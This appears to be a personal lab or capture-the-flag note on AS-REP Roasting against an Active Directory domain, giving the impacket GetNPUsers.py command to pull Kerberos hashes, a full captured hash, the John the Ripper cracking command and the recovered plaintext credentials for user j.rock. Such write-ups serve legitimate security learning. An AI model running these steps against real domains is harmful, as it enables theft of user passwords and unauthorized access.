## AS-REP Roasting
AS-REP Roasting is the technique that enables the attacker to retrieve `password hashes for AD users` whose account options have been set to **"Do not require Kerberos pre-authentication"**. This option relies on the old Kerberos authentication protocol, which allows authentication without a password. Once we obtain the hashes, we can try to crack it offline, and finally, if it is crackable, we got a password!


## Performing an AS-REP Roasting Attack against Users List

#Attacking_Machine 
Export AS-REP entries in **John** format.

```
/usr/share/doc/python3-impacket/examples/GetNPUsers.py -dc-ip <MACHINE IP> services.local/ -usersfile users.txt -request -format john -outputfile asreps.john
```

`-request` tells the script to request the TGTs.
`-format john` outputs the hashes in John The Ripper format .
`-outputfile` writes them to `asreps.john`.

![[Screenshot_2025-10-21_05-33-48.png]]

You'll get a hash.

## Cracking Hash

#Attacking_machine 
1. Copy the hash to a file called `hash.txt`.
```
echo "$krb5asrep$j.rock@SERVICES.LOCAL:d3806d33a6a4b744bfa1443aad9136e1$685d4b94ead269c32f6a2e29ba4ddca3cbbb975ea70073e820fd15f15c7b88e11f2a35d8b3cdded4c41122c03fb546a4ae1a8cb49e77b7509b4e898f0464923f5232a3dfd95b7160e101dfae75be56c2023af6357ee1efd2af81b39294f4136a4cbc958780753e7cd943c5b4a4ce7c08dc28140c36916b02696ba34b655eaa3aebbf3490113dcbe14e327ca3f489508d75351fdf53c8f71a3fe3a6a14dfd708640ce6be9b580b730e3b665ec50f948986edfcd8188d5da0b2f48eafbb83846ec783bb0d010f76f1c9ba246f8877bd31efa51518f91098b04435ce66fad16107898061d5dbb64a229aa3998c5a8cbf66c
" > hash.txt
```

2.  Run this command to crack the hash with John the Ripper.


```
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

![[Screenshot_2025-10-21_06-11-43.png]]

Credentials:

`j.rock@SERVICES.LOCAL:Serviceworks1`

**Next step:** [[Connecting the Machine]]
